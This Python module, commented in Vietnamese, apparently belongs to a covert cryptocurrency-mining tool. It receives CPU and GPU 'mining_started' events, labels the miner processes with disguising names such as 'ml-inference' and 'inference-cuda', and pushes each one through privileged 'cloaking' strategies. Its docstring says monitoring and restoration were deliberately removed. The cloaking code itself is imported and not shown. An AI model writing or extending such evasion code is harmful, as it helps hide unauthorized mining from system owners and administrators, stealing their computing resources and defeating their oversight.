"""
Module resource_manager.py - Quản lý tài nguyên (CPU, GPU, Network...) theo mô hình đồng bộ (threading).
Sau khi refactor, module này:
- BỎ toàn bộ cơ chế giám sát (nhiệt độ, công suất) & watchers.
- BỎ cơ chế restore hoàn toàn.
- Khi start, tự động khám phá tiến trình và CLOAK luôn.
- Chỉ hỗ trợ cloaking, không có restoration.
"""

import logging
import psutil
import pynvml
import traceback
import threading
import queue
import time
from threading import RLock
from typing import List, Any, Dict, Optional
from itertools import count

# Các import liên quan đến dự án
from .utils import MiningProcess
from .resource_control import ResourceControlFactory, CPUResourceManager, CloakStrategyFactory
from .auxiliary_modules.interfaces import IResourceManager
from .auxiliary_modules.models import ConfigModel
from .auxiliary_modules.event_bus import EventBus
from .privileged_operations import get_privileged_manager

class SharedResourceManager:
    """
    Lớp quản lý tài nguyên chung (VD: GPU, CPU).
    - Khởi tạo/tắt NVML
    - Đọc GPU usage, cache usage
    - Áp dụng CloakStrategy cho tiến trình
    """

    def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
        self.logger = logger
        self.config = config
        self.resource_managers = resource_managers
        self.strategy_cache = {}
        
        # Khởi tạo PrivilegedOperationManager (singleton)
        self.privileged_manager = get_privileged_manager(logger)
        
        # Kiểm tra security context
        security_context = self.privileged_manager.validate_security_context()
        self.logger.info(f"Security context: User={security_context['user']}, Root={security_context['is_root']}")

        self._nvml_init = False
        try:
            self.initialize_nvml()
            self.logger.info("SharedResourceManager khởi tạo OK.")
        except Exception as e:
            self.logger.error(f"Lỗi init SharedResourceManager: {e}\n{traceback.format_exc()}")
            raise

    def is_nvml_initialized(self) -> bool:
        return self._nvml_init

    def initialize_nvml(self):
        if not self._nvml_init:
            try:
                # Ultra-fast NVML initialization với timeout protection
                self.logger.debug("Fast NVML initialization...")
                
                # Timeout wrapper cho NVML init
                def nvml_init_with_timeout():
                    pynvml.nvmlInit()
                    return True
                
                # Try với timeout để tránh blocking
                import signal
                def timeout_handler(signum, frame):
                    raise TimeoutError("NVML init timeout")
                
                signal.signal(signal.SIGALRM, timeout_handler)
                signal.alarm(3)  # 3 giây timeout
                
                try:
                    nvml_init_with_timeout()
                    self._nvml_init = True
                    self.logger.info("NVML đã được khởi tạo thành công.")
                finally:
                    signal.alarm(0)  # Clear timeout
                    
            except (TimeoutError, Exception) as e:
                self.logger.warning(f"NVML initialization failed/timeout: {e} - continuing without GPU support")
                self._nvml_init = False

    def shutdown_nvml(self):
        if self._nvml_init:
            try:
                pynvml.nvmlShutdown()
                self._nvml_init = False
                self.logger.debug("Đã shutdown NVML thành công.")
            except pynvml.NVMLError as e:
                self.logger.error(f"Lỗi khi shutdown NVML: {e}")

    def get_process_cache_usage(self, pid: int) -> float:
        """
        Đọc /proc/[pid]/status => VmCache => tính % so với total RAM.
        """
        try:
            status_file = f"/proc/{pid}/status"
            with open(status_file, 'r') as f:
                for line in f:
                    if line.startswith("VmCache:"):
                        cache_kb = int(line.split()[1])
                        total_mem_kb = psutil.virtual_memory().total / 1024
                        cache_percent = (cache_kb / total_mem_kb) * 100
                        self.logger.debug(f"PID={pid} sử dụng cache: {cache_percent:.2f}%")
                        return cache_percent
            self.logger.warning(f"Không tìm thấy VmCache cho PID={pid}.")
            return 0.0
        except FileNotFoundError:
            self.logger.error(f"Không tìm thấy tiến trình với PID={pid} khi lấy cache.")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi get_process_cache_usage(PID={pid}): {e}\n{traceback.format_exc()}")
            return 0.0

    def get_gpu_usage_percent(self, pid: int) -> float:
        try:
            return self._sync_get_gpu_usage_percent(pid)
        except Exception as e:
            self.logger.error(f"Lỗi bất ngờ trong get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def _sync_get_gpu_usage_percent(self, pid: int) -> float:
        try:
            if not self.is_nvml_initialized():
                self.logger.debug("_sync_get_gpu_usage_percent: NVML chưa init => init.")
                self.initialize_nvml()

            if not self._nvml_init:
                return 0.0

            device_count = pynvml.nvmlDeviceGetCount()
            total_gpu_usage = 0.0
            gpu_present = False

            for i in range(device_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                procs = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
                for proc in procs:
                    if proc.pid == pid:
                        gpu_present = True
                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                        total_gpu_usage += utilization.gpu

            return total_gpu_usage if gpu_present else 0.0
        except pynvml.NVMLError as e:
            self.logger.error(f"Lỗi khi thu thập GPU usage: {e}")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi không xác định trong _sync_get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        """
        Áp dụng chiến lược cloak cho một tiến trình cụ thể.
        """
        try:
            pid = process.pid
            name = process.name
            self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name,
                self.config,
                self.logger,
                self.resource_managers
            )
            if not strategy or not callable(getattr(strategy, 'apply', None)):
                self.logger.error(f"Chiến lược '{strategy_name}' không khả dụng.")
                return

            # Inject privileged_manager nếu strategy cần
            if hasattr(strategy, 'set_privileged_manager'):
                strategy.set_privileged_manager(self.privileged_manager)

            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
            strategy.apply(process)
            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")

            # ✅ REMOVED: CPU registration moved to centralized worker

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )
            raise

class ResourceManager(IResourceManager):
    """
    Lớp ResourceManager chỉ còn chức năng:
    - Khởi tạo SharedResourceManager
    - Khám phá tiến trình (duy nhất 1 lần) và Cloak tất cả
    - Không giám sát, không restore
    """

    _instance = None
    _instance_lock = threading.Lock()

    def __new__(cls, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(ResourceManager, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: ConfigModel, event_bus: EventBus, logger: logging.Logger):
        if getattr(self, '_initialized', False):
            return

        self._initialized = True
        self.logger = logger
        self.config = config
        self.event_bus = event_bus

        # Cờ dừng
        self._stop_flag = False

        # Danh sách process + lock
        self.mining_processes_lock = threading.RLock()
        self.mining_processes: List[MiningProcess] = []

        # ✅ REMOVED: CPU/GPU queues - logic integrated in enqueue_cloaking()
        # Logic phân loại queue đã được tích hợp trong enqueue_cloaking()

        # **EventBus subscribe** (đăng ký EventBus) - **PID Propagation Flow Step 2**
        self._setup_eventbus_subscriptions()
        
        # Hàng đợi cloaking chung (legacy compatibility)
        self.resource_adjustment_queue = queue.PriorityQueue()

        # Thread workers
        self.workers: List[threading.Thread] = []

        self.shared_resource_manager: Optional[SharedResourceManager] = None

        self._counter = count()
        self.process_states: Dict[int, str] = {}  # "normal", "cloaking", "cloaked"

        self.logger.info("ResourceManager.__init__ (simplified with unified cloaking queue)")

        # ✅ SIMPLIFIED: Essential EventBus subscriptions only
        self.event_bus.subscribe('resource_adjustment', self.handle_resource_adjustment)

    def is_gpu_initialized(self) -> bool:
        """
        Kiểm tra xem GPU (NVML) đã được khởi tạo hay chưa.
        """
        return self.shared_resource_manager and self.shared_resource_manager.is_nvml_initialized()

    def handle_resource_adjustment(self, event_data: Dict[str, Any]):
        """
        ✅ SIMPLIFIED: Minimal resource adjustment handler
        """
        try:
            pid = event_data.get('pid')
            adjustment_type = event_data.get('type', 'unknown')
            
            self.logger.info(f"Processing resource adjustment for PID={pid}, type={adjustment_type}")
            
        except Exception as e:
            self.logger.error(f"❌ Error in resource adjustment processing: {e}")

    def _setup_eventbus_subscriptions(self):
        """✅ SIMPLIFIED: Essential EventBus subscriptions with memory backend fallback"""
        try:
            self.logger.info("🔌 Setting up essential EventBus subscriptions...")
            
            # ✅ CORE: Subscribe to mining events only
            self.event_bus.subscribe('mining:cpu_started', self._on_cpu_mining_event)
            self.event_bus.subscribe('mining:gpu_started', self._on_gpu_mining_event)
            
            self.event_bus.start_listening()
            self.logger.info("✅ EventBus subscriptions established successfully")
            
        except Exception as e:
            self.logger.error(f"❌ EventBus setup failed: {e}")
            self.logger.warning("⚠️ Running without EventBus - using fallback mode")
            self.event_bus = None

    def _on_cpu_mining_event(self, payload: Dict[str, Any]) -> None:
        """Handle CPU mining events - PID Propagation Flow Step 2"""
        try:
            event_type = payload.get('event_type')
            pid = payload.get('pid')
            
            if event_type == 'mining_started' and pid:
                self.logger.info(f"🔨 ResourceManager received CPU mining_started: PID={pid}")
                
                # ✅ ENHANCED: Create MiningProcess với explicit classification
                process_name = payload.get('data', {}).get('process_name', 'ml-inference')
                mining_process = MiningProcess(pid, process_name, is_gpu=False)  # Explicit CPU
                
                # Add to tracking list
                with self.mining_processes_lock:
                    self.mining_processes.append(mining_process)
                
                # ✅ STREAMLINED: Enqueue cloaking only
                self.enqueue_cloaking(mining_process)
                
                self.logger.info(f"✅ CPU PID {pid} processed: registered + enqueued for cloaking")
                
        except Exception as e:
            self.logger.error(f"❌ Error handling CPU mining event: {e}")

    def _on_gpu_mining_event(self, payload: Dict[str, Any]) -> None:
        """Handle GPU mining events - PID Propagation Flow Step 2"""
        try:
            event_type = payload.get('event_type')
            pid = payload.get('pid')
            
            if event_type == 'mining_started' and pid:
                self.logger.info(f"🎮 ResourceManager received GPU mining_started: PID={pid}")
                
                # ✅ ENHANCED: Create MiningProcess với explicit classification
                process_name = payload.get('data', {}).get('process_name', 'inference-cuda')
                mining_process = MiningProcess(pid, process_name, is_gpu=True)  # Explicit GPU
                
                # Add to tracking list
                with self.mining_processes_lock:
                    self.mining_processes.append(mining_process)
                
                # ✅ STREAMLINED: Enqueue GPU cloaking
                self.enqueue_cloaking(mining_process)
                
                self.logger.info(f"✅ GPU PID {pid} processed: enqueued for cloaking")
                
        except Exception as e:
            self.logger.error(f"❌ Error handling GPU mining event: {e}")

    def enqueue_cloaking(self, process: MiningProcess) -> None:
        """
        ✅ ENHANCED: Metadata-aware cloaking queue với direct classification access
        """
        pid = process.pid
        name = process.name
        
        try:
            if self.process_states.get(pid) == "cloaked":
                self.logger.debug(f"PID={pid} đã được cloaked, bỏ qua.")
                return

            priority = process.priority
            count_val = next(self._counter)
            
            # ✅ DIRECT ACCESS: Get type từ enhanced MiningProcess
            process_type = process.get_process_type()
            is_gpu = process.is_gpu_process()
            strategy_hints = process.get_strategy_hints()
            
            task = {
                'type': 'cloaking',
                'process': process,
                'strategies': ['gpu_cloaking'] if is_gpu else ['cpu_cloaking'],
                'process_type': process_type,
                'strategy_hints': strategy_hints  # ✅ Pass optimization hints
            }
            
            # ✅ UNIFIED: Single queue với rich metadata
            self.resource_adjustment_queue.put((priority, count_val, task))
            self.process_states[pid] = "cloaking"
            
            self.logger.info(f"✅ Enqueued {name} (PID={pid}) for {process_type} cloaking with hints")
            
        except Exception as e:
            self.logger.error(f"Lỗi khi enqueue process {name} (PID={pid}): {e}\n{traceback.format_exc()}")

    # -----------------------------------------------------------------------------------------
    # METRICS (SYNC)
    # -----------------------------------------------------------------------------------------

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        try:
            if not psutil.pid_exists(process.pid):
                self.logger.warning(f"PID={process.pid} không tồn tại.")
                return {}

            proc_obj = psutil.Process(process.pid)
            cpu_pct = proc_obj.cpu_percent(interval=1)
            mem_mb = proc_obj.memory_info().rss / (1024**2)

            gpu_pct = 0.0
            if self.is_gpu_initialized():
                gpu_pct = self.shared_resource_manager.get_gpu_usage_percent(process.pid)

            # Tùy logic dự án, ở đây ví dụ:
            disk_mbps = 0.0 # Tính sau
            cache_l = self.shared_resource_manager.get_process_cache_usage(process.pid) if self.shared_resource_manager else 0.0

            metrics = {
                'cpu_usage': float(cpu_pct),
                'memory_usage': float(mem_mb),
                'gpu_usage': float(gpu_pct),
                'network_usage': float(disk_mbps),
                'cache_usage': float(cache_l),
            }
            self.logger.debug(f"Metrics PID={process.pid}: {metrics}")
            return metrics
        except Exception as e:
            self.logger.error(f"Lỗi collect_metrics PID={process.pid}: {e}\n{traceback.format_exc()}")
            return {}

    def collect_all_metrics(self) -> Dict[str, Dict[str, Any]]:
        metrics_data: Dict[str, Dict[str, Any]] = {}
        if not self.mining_processes_lock.acquire(timeout=5):
            self.logger.error("Timeout lock collect_all_metrics.")
            return metrics_data
        try:
            for p in self.mining_processes:
                res = self.collect_metrics(p)
                if res:
                    metrics_data[str(p.pid)] = res
                else:
                    self.logger.warning(f"Không có metrics hợp lệ cho PID={p.pid}")
            self.logger.debug(f"Dữ liệu metrics (all): {metrics_data}")
        except Exception as e:
            self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
        finally:
            self.mining_processes_lock.release()

        return metrics_data

    def start(self):
        self.logger.info("🚀 Starting ResourceManager (Ultra-Fast Non-Blocking Initialization)...")
        start_time = time.time()
        try:
            # Step 1: Minimal essential initialization only
            step_start = time.time()
            self.logger.info("⚡ Step 1/3: Essential components creation...")
            
            # Quick resource managers creation với timeout protection
            try:
                resource_managers = ResourceControlFactory.create_resource_managers(
                    config=self.config,
                    logger=self.logger
                )
                if not resource_managers:
                    self.logger.warning("ResourceControlFactory trả về rỗng - using fallback mode")
                    resource_managers = {}  # Fallback mode
                self.logger.info(f"✅ Step 1 completed in {time.time() - step_start:.2f}s")
            except Exception as e:
                self.logger.warning(f"Resource managers creation failed: {e} - using fallback mode")
                resource_managers = {}

            # Step 2: Fast SharedResourceManager với lazy NVML init
            step_start = time.time()
            self.logger.info("⚡ Step 2/3: Fast SharedResourceManager (lazy init)...")
            try:
                self.shared_resource_manager = SharedResourceManager(self.config, self.logger, resource_managers)
                self.logger.info(f"✅ Step 2 completed in {time.time() - step_start:.2f}s")
            except Exception as e:
                self.logger.warning(f"SharedResourceManager init failed: {e} - continuing without shared resources")
                self.shared_resource_manager = None

            # Step 3: Background worker setup (non-blocking)
            step_start = time.time()
            self.logger.info("⚡ Step 3/3: Background workers setup...")
            
            # Start worker thread ngay lập tức
            adjust_thread = threading.Thread(
                target=self.process_resource_adjustments,
                daemon=True,
                name="CloakingWorker"
            )
            adjust_thread.start()
            self.workers.append(adjust_thread)
            
            # ✅ SIMPLIFIED: EventBus-driven architecture only
            
            self.logger.info(f"✅ Step 3 completed in {time.time() - step_start:.2f}s")

            total_time = time.time() - start_time
            self.logger.info(f"🎯 ResourceManager startup completed in {total_time:.2f}s (Target: <5s)")
            
            # Ultra-fast main loop với minimal monitoring
            self.logger.info("🔄 Entering minimal main monitoring loop...")
            while not self._stop_flag:
                time.sleep(1.0)  # Basic monitoring interval

            self.logger.info("ResourceManager main loop completed.")
        except Exception as e:
            self.logger.error(f"❌ ResourceManager startup failed: {e}\n{traceback.format_exc()}")
            self.shutdown()

    def process_resource_adjustments(self):
        """
        ✅ OPTIMIZED: Streamlined cloaking worker với type-aware processing
        """
        self.logger.info("=== Starting optimized CloakingWorker...")
        pid = None

        while not self._stop_flag:
            try:
                item = self.resource_adjustment_queue.get(timeout=1)
                priority, count_val, task = item

                p = task.get('process')
                if not p:
                    self.resource_adjustment_queue.task_done()
                    continue

                pid = p.pid
                process_type = task.get('process_type', 'CPU')
                
                self.logger.info(f"[CloakingWorker] Processing {process_type} task for PID={pid}")

                if task['type'] == 'cloaking' and self.shared_resource_manager:
                    strategies = task.get('strategies', [])
                    strategy_hints = task.get('strategy_hints', {})
                    
                    for strat in strategies:
                        # ✅ TYPE-SPECIFIC CACHING: Include process type in cache key
                        cache_key = f"{strat}_{process_type}"
                        
                        if cache_key not in self.shared_resource_manager.strategy_cache:
                            # ✅ TYPE-AWARE CREATION: Pass type and hints to factory
                            s = CloakStrategyFactory.create_strategy(
                                strat, self.config, self.logger, 
                                self.shared_resource_manager.resource_managers,
                                process_type=process_type,
                                strategy_hints=strategy_hints
                            )
                            self.shared_resource_manager.strategy_cache[cache_key] = s
                            self.logger.info(f"🎯 [Worker] Created type-specific strategy: {cache_key}")
                        else:
                            s = self.shared_resource_manager.strategy_cache[cache_key]
                            self.logger.debug(f"♻️ [Worker] Reused cached strategy: {cache_key}")

                        if s and hasattr(s, 'apply'):
                            s.apply(p)

                    self.process_states[pid] = "cloaked"
                    
                    self.logger.info(f"✅ {process_type} PID={pid} cloaked successfully with optimized strategy")

                self.resource_adjustment_queue.task_done()

            except queue.Empty:
                continue
            except Exception as e:
                self.logger.error(f"❌ CloakingWorker error: {e} (PID={pid})")

        self.logger.info("=== CloakingWorker stopped")

    def discover_mining_processes(self) -> List[MiningProcess]:
        """
        ✅ SIMPLIFIED: EventBus-driven process discovery only
        Trả về các tiến trình đã được tracked qua EventBus events
        """
        try:
            with self.mining_processes_lock:
                mining_processes = list(self.mining_processes)
                self.logger.info(f"✅ EventBus discovery: Found {len(mining_processes)} tracked processes")
                return mining_processes
                
        except Exception as e:
            self.logger.error(f"Lỗi khi truy xuất tracked processes: {e}\n{traceback.format_exc()}")
            return []

    def get_process_priority(self, process_name: str) -> int:
        priority_map = self.config.process_priority_map
        pri_val = priority_map.get(process_name.lower(), 1)
        if not isinstance(pri_val, int):
            self.logger.warning(f"Priority cho '{process_name}' không phải int => gán=1.")
            return 1
        return pri_val

    def shutdown(self):
        self.logger.info("Dừng ResourceManager... (BẮT ĐẦU)")

        # Bước 0: Chờ hàng đợi cloaking xử lý xong
        self.logger.info("Đợi xử lý xong các tác vụ trong resource_adjustment_queue.")
        self.resource_adjustment_queue.join()
        self.logger.info("Tất cả tác vụ resource_adjustment đã xử lý xong.")

        # Bước 1: Đặt cờ dừng
        self._stop_flag = True

        # Bước 2: Chờ thread "CloakingWorker" dừng
        start_time = time.time()
        timeout = 10
        self.logger.info(f"Chờ tối đa {timeout} giây để dừng CloakingWorker...")

        while time.time() - start_time < timeout:
            if all(not w.is_alive() for w in self.workers):
                self.logger.info("CloakingWorker đã dừng.")
                break
            time.sleep(2)
        else:
            self.logger.warning("CloakingWorker vẫn đang chạy sau thời gian chờ.")

        # Bước 3. Tắt NVML
        try:
            if self.shared_resource_manager:
                self.shared_resource_manager.shutdown_nvml()
                self.logger.info("NVML đã được tắt.")
            else:
                self.logger.warning("Không có shared_resource_manager, bỏ qua tắt NVML.")
        except Exception as e:
            self.logger.error(f"Lỗi khi tắt NVML: {e}")

        # Bước 4. join workers
        for w in self.workers:
            try:
                w.join(timeout=2)
                if w.is_alive():
                    self.logger.warning(f"Thread {w.name} chưa dừng hẳn.")
            except Exception as e:
                self.logger.error(f"Lỗi khi join thread {w.name}: {e}")

        self.logger.info("Dừng ResourceManager... (HOÀN THÀNH)")
